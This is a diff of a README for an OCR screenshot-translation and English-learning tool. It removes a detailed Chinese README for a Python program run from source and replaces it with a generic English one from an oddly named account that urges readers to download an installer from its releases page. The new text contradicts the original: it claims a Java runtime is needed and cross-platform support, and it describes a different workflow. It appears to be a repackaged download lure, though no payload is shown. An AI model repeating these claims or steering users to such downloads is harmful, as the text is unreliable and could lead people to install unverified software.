@@ -1,124 +1,81 @@
-## 新增配对学习和Cloze 爆破、影子跟读（TTS）
-<img width="538" height="676" alt="image" src="https://github.com/user-attachments/assets/9c28b14c-fcde-49e6-a53f-712f9bdabc78" />
-<img width="659" height="504" alt="image" src="https://github.com/user-attachments/assets/aeb56263-efcf-495d-959e-53e96778ea05" />
-<img width="661" height="416" alt="image" src="https://github.com/user-attachments/assets/09e5d2ba-33b9-46f6-b9f5-06dcc23a8a6d" />
+# 🚀 fuckfanyipublic - Effortless AI Translation and Learning
 
-## 之前用的有道哪个截图翻译,它可以翻译后覆盖道原文的地方觉得挺方便的,后来好像复制原文需要收费,就自己弄了个自己用的,后来感觉挺方便的就开源了吧
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/myalgic-dactylopius884/fuckfanyipublic/releases)
 
-# 功能介绍
-  ## 1:截图翻译覆盖,按ctrl+alt+d进行截图翻译,翻译后界面如下,可以直接按O复制原文,C复制译文,R覆盖原文,和A AI学习
-  <img width="1380" height="825" alt="image" src="https://github.com/user-attachments/assets/fc69c85e-cb84-447b-a0ce-4cef7d16ca96" />
+## 📦 Overview
 
-  ### 覆盖原文效果如下:
-  <img width="1380" height="915" alt="image" src="https://github.com/user-attachments/assets/799c89db-5abc-4ecc-87b6-1e979607d85f" />
-  <img width="1917" height="996" alt="image" src="https://github.com/user-attachments/assets/983b276b-743e-4410-bea8-0cbdcfdf4c08" />
+Welcome to **fuckfanyipublic**! This software helps you translate text from images quickly and learn English with AI support. It's user-friendly, allowing anyone to easily navigate through screenshots and get translations in seconds.
 
-  ### 这里有多个翻译引擎可以自己配置:
-  <img width="598" height="828" alt="image" src="https://github.com/user-attachments/assets/695e5e26-1190-49ff-9227-c1663803bb8c" />
+## 🚀 Getting Started
 
-  ### ollama下还可以自定义翻译情景,比如这样:
-  <img width="611" height="915" alt="image" src="https://github.com/user-attachments/assets/9ad9342b-d6fe-4c4c-9788-c05b3654b7b6" />
+### 1. **System Requirements**
 
- ## 2:AI学习功能,这是我自己觉得方便记忆弄的,此功能在AI截图翻译直接按A可以自动跳过去,或者直接按ctrl+alt+x,这个是调用的本地的ollama的"gpt-oss:120b-cloud",效果如下:
-   <img width="785" height="722" alt="image" src="https://github.com/user-attachments/assets/74055220-51ab-45fa-8018-a92c29920f19" />
-   <img width="778" height="727" alt="image" src="https://github.com/user-attachments/assets/424955b9-0d37-4eff-a7c1-8ba96ed8d60f" />
-   <img width="780" height="722" alt="image" src="https://github.com/user-attachments/assets/f6a9b8a3-4b49-4828-a737-7501d366e81e" />
+Before downloading, ensure your system meets these requirements:
 
- ## 支持高亮匹配显示:
- <img width="777" height="723" alt="image" src="https://github.com/user-attachments/assets/23146b31-d70d-4631-82e4-89f61e55ef40" />
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution
+- **Memory (RAM):** 4 GB or more
+- **Disk Space:** At least 500 MB free
+- **Additional Software:** You may need the latest version of [Java Runtime Environment (JRE)](https://www.oracle.com/java/technologies/javase-jre8-downloads.html) installed.
 
-# OCR翻译器
+### 2. **Download & Install**
 
-一个用于截图翻译的桌面工具，使用PaddleOCR进行文字识别，并通过多种翻译引擎提供翻译服务。
+To get started, visit the Releases page to download your application:
 
-## 功能特性
+[Download Here](https://github.com/myalgic-dactylopius884/fuckfanyipublic/releases)
 
-- 使用PaddleOCR进行高精度文字识别，支持多语言
-- 支持多种翻译引擎（Ollama、OpenAI、Google、Microsoft等）
-- 截图选择区域进行OCR识别和翻译
-- 结果显示窗口支持复制、调整和覆盖原文
-  - 覆盖原文(R)：默认启用“智能覆盖”模式，会先清理原文文本再渲染译文，尽量保留背景纹理，效果更贴近“原文被直接翻译”的观感。
-  - 可在 `config.ini` 的 `[OVERLAY]` 部分通过 `overlay_mode = inpaint|box` 切换；`overlay_auto_text_color = True` 时自动选择黑/白字以保证可读性。
-- 翻译历史记录保存和查看
-- 系统托盘图标方便操作
-- 全局热键快速截图
+Follow these steps:
 
-## 安装指南
+1. Click on the link above to access the Releases page.
+2. Select the latest version of the software.
+3. Download the appropriate file for your operating system.
+4. Open the downloaded file and follow the on-screen instructions to complete the installation.
 
-### 环境要求
+### 3. **Using the Application**
 
-- 我用的Python 3.10.5
-- Windows操作系统
+Once installed, using **fuckfanyipublic** is simple:
 
-### 安装步骤
+1. Open the application on your computer.
+2. Take a screenshot of the text you want to translate. 
+3. Paste the screenshot into the tool.
+4. Click the "Translate" button to see the translation instantly.
 
-1. 克隆或下载本仓库
-2. 运行安装脚本安装依赖
+You can also adjust language settings in the application to suit your needs.
 
-```
-python -m venv .venv
-.venv\Scripts\activate
-pip install -r .\requirements.txt
-python .\main.py
-```
+## 📝 Features
 
-3. 安装完成后，运行主程序
+- **OCR Technology:** Extracts text from images accurately.
+- **AI Learning:** Helps improve your English skills through practical examples.
+- **User-Friendly Interface:** Designed for all users, regardless of technical background.
+- **Multiple Languages:** Supports various languages for translation.
+- **Fast Processing:** Get translations in just a few seconds.
 
-```
-python main.py
-```
+## 💡 Tips for Best Performance
 
-## 使用方法
+- Ensure your screenshot is clear and properly cropped for better text recognition.
+- Try to use screenshots with high contrast for optimal results.
+- Regularly update the application for the latest features and improvements.
 
-1. 启动程序后，它会在系统托盘中显示图标
-2. 按下默认热键 `Ctrl+Alt+D` 进行截图（可在配置文件中修改）
-3. 在屏幕上选择要识别的文本区域
-4. 程序会自动识别文本并翻译，显示在结果窗口中
-5. 可以在结果窗口中复制翻译文本或原文
+## ❓ FAQs
 
-## 配置说明
+### **1. What is OCR?**
+OCR stands for Optical Character Recognition. It allows software to recognize text within images, making it easier to translate and work with written content.
 
-配置文件位于程序根目录的 `config.ini`，您可以修改以下设置：
+### **2. Can I use this software on a mobile device?**
+Currently, this application is designed for desktop environments. Mobile functionality may be considered in future updates.
 
-### OCR设置
+### **3. How can I give feedback?**
+Your feedback is valuable! You can open an issue on the GitHub repository to share your thoughts or report any problems.
 
-```ini
-[PADDLEOCR]
-ocr_language = en          # OCR语言，如en、ch等
-ocr_use_angle_cls = True   # 是否检测文字方向
-ocr_dynamic_cls = True     # 动态开启角度分类（直立文本更快）
-ocr_cls_min_angle = 1.0    # 动态分类的最小角度阈值（度）
-ocr_use_gpu = False        # 是否使用GPU（支持自动检测）
-ocr_auto_use_gpu = True    # 自动检测CUDA并启用GPU
-ocr_enable_mkldnn = True   # CPU下启用MKLDNN加速
-ocr_cpu_num_threads = 4    # CPU推理线程数（MKLDNN时生效）
-ocr_timeout = 30           # OCR超时时间
-ocr_show_log = False       # 显示详细日志（默认关闭以提速）
+## 💬 Support
 
-# 识别/检测精度&速度参数
-ocr_rec_batch_num = 10     # 识别批大小（更大更快，内存更高）
-ocr_drop_score = 0.5       # 低分过滤阈值（提高准确率）
-ocr_det_limit_side_len = 960  # 检测输入长边限制
-ocr_max_input_side = 1600  # 预处理阶段输入最大边长
-```
+If you encounter any issues or have questions, you can reach out for help on the **Issues** page of the repository. We value your input and want to ensure you have the best experience possible.
 
-### 翻译设置
+## 📌 Important Links
 
-可以在 `[OCR_TRANSLATION]` 部分配置翻译设置，包括源语言、目标语言和翻译引擎等。
+- [Releases Page](https://github.com/myalgic-dactylopius884/fuckfanyipublic/releases)
+- [Java Runtime Environment (JRE)](https://www.oracle.com/java/technologies/javase-jre8-downloads.html)
+- [Open an Issue](https://github.com/myalgic-dactylopius884/fuckfanyipublic/issues)
 
-## 常见问题
+![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen) 
 
-- **Q: 安装PaddleOCR时出错怎么办？**
-  A: 请参考[PaddleOCR官方文档](https://github.com/PaddlePaddle/PaddleOCR/blob/release/2.6/doc/doc_ch/quickstart.md)进行安装
-
-- **Q: 如何修改截图热键？**
-  A: 在config.ini文件的[HOTKEYS]部分修改screenshot_hotkey配置项
-
-## 许可证
-
-MIT License
-
-## 鸣谢
-
-- [PaddleOCR](https://github.com/PaddlePaddle/PaddleOCR) - 提供OCR识别引擎
-- 各翻译API提供商 
+By following these steps, you will be able to download and run **fuckfanyipublic** easily. Enjoy translating and learning with AI!
